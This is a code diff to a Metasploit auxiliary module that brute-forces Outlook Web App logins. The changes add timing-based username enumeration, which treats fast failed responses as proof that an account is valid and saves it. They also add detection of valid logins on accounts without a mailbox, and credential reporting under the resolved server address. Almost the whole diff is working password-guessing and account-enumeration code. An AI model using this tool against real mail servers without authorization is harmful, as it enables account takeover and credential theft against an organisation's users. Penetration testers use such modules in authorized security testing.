@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rex/proto/ntlm/message'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Exploit::Remote::HttpClient
@@ -28,7 +26,9 @@ class Metasploit3 < Msf::Auxiliary
           'sinn3r',
           'Brandon Knight',
           'Pete (Bokojan) Arzamendi', # Outlook 2013 updates
-          'Nate Power'                # HTTP timing option
+          'Nate Power',                # HTTP timing option
+          'Chapman (R3naissance) Schleiss', # Save username in creds if response is less
+          'Andrew Smith' # valid creds, no mailbox
         ],
       'License'        => MSF_LICENSE,
       'Actions'        =>
@@ -79,18 +79,18 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptInt.new('RPORT', [ true, "The target port", 443]),
-        OptAddress.new('RHOST', [ true, "The target address", true]),
+        OptAddress.new('RHOST', [ true, "The target address" ]),
         OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
         OptBool.new('AUTH_TIME', [ false, "Check HTTP authentication response time", true])
-      ], self.class)
+      ])
 
 
     register_advanced_options(
       [
         OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", ''])
-      ], self.class)
+      ])
 
-    deregister_options('BLANK_PASSWORDS', 'RHOSTS','PASSWORD','USERNAME')
+    deregister_options('BLANK_PASSWORDS', 'RHOSTS')
   end
 
   def setup
@@ -157,7 +157,7 @@ class Metasploit3 < Msf::Auxiliary
       'Cookie' => 'PBack=0'
     }
 
-    if (datastore['SSL'].to_s.match(/^(t|y|1)/i))
+    if datastore['SSL']
       if action.name == "OWA_2013"
         data = 'destination=https://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
       else
@@ -194,7 +194,11 @@ class Metasploit3 < Msf::Auxiliary
 
     if not res
       print_error("#{msg} HTTP Connection Error, Aborting")
-      return :abort
+      return
+    end
+
+    if res.peerinfo['addr'] != datastore['RHOST']
+      vprint_status("#{msg} Resolved hostname '#{datastore['RHOST']}' to address #{res.peerinfo['addr']}")
     end
 
     if action.name != "OWA_2013" and res.get_cookies.empty?
@@ -207,7 +211,7 @@ class Metasploit3 < Msf::Auxiliary
       if res.headers['location'] =~ /expiredpassword/
         print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}': NOTE password change required")
         report_cred(
-          ip: datastore['RHOST'],
+          ip: res.peerinfo['addr'],
           port: datastore['RPORT'],
           service_name: 'owa',
           user: user,
@@ -217,6 +221,19 @@ class Metasploit3 < Msf::Auxiliary
       end
 
       # No password change required moving on.
+      # Check for valid login but no mailbox setup
+      if res.headers['location'] =~ /owa/ and res.headers['location'] !~ /reason/
+        print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}': NOTE a mailbox is not setup")
+        report_cred(
+          ip: res.peerinfo['addr'],
+          port: datastore['RPORT'],
+          service_name: 'owa',
+          user: user,
+          password: pass
+        )
+        return :next_user
+      end
+
       unless location = res.headers['location']
         print_error("#{msg} No HTTP redirect.  This is not OWA 2013, aborting.")
         return :abort
@@ -225,9 +242,20 @@ class Metasploit3 < Msf::Auxiliary
       if reason == nil
         headers['Cookie'] = 'PBack=0;' << res.get_cookies
       else
-      # Login didn't work. no point on going on.
-        vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (HTTP redirect with reason #{reason})")
-        return :Skip_pass
+        # Login didn't work. no point in going on, however, check if valid domain account by response time.
+        if elapsed_time <= 1
+          report_cred(
+            ip: res.peerinfo['addr'],
+            port: datastore['RPORT'],
+            service_name: 'owa',
+            user: user
+          )
+          print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
+          return :Skip_pass
+        else
+          vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (HTTP redirect with reason #{reason})")
+          return :Skip_pass
+        end
       end
     else
        # The authentication info is in the cookies on this response
@@ -261,14 +289,25 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if res.redirect?
-      vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
-      return :skip_pass
+      if elapsed_time <= 1
+        report_cred(
+          ip: res.peerinfo['addr'],
+          port: datastore['RPORT'],
+          service_name: 'owa',
+          user: user
+        )
+        print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
+        return :Skip_pass
+      else
+        vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
+        return :skip_pass
+      end
     end
 
     if res.body =~ login_check
       print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'")
       report_cred(
-        ip: datastore['RHOST'],
+        ip: res.peerinfo['addr'],
         port: datastore['RPORT'],
         service_name: 'owa',
         user: user,
@@ -276,8 +315,19 @@ class Metasploit3 < Msf::Auxiliary
       )
       return :next_user
     else
-      vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response body did not match)")
-      return :skip_pass
+      if elapsed_time <= 1
+        report_cred(
+          ip: res.peerinfo['addr'],
+          port: datastore['RPORT'],
+          service_name: 'owa',
+          user: user
+        )
+        print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
+        return :Skip_pass
+      else
+        vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response body did not match)")
+        return :skip_pass
+      end
     end
   end
 
@@ -331,13 +381,22 @@ class Metasploit3 < Msf::Auxiliary
       workspace_id: myworkspace_id
     }
 
-    credential_data = {
-      origin_type: :service,
-      module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :password
-    }.merge(service_data)
+    # Test if password was passed, if so, add private_data. If not, assuming only username was found
+    if opts.has_key?(:password)
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        username: opts[:user],
+        private_data: opts[:password],
+        private_type: :password
+      }.merge(service_data)
+    else
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        username: opts[:user]
+      }.merge(service_data)
+    end
 
     login_data = {
       core: create_credential(credential_data),
@@ -351,5 +410,4 @@ class Metasploit3 < Msf::Auxiliary
   def msg
     "#{vhost}:#{rport} OWA -"
   end
-
 end
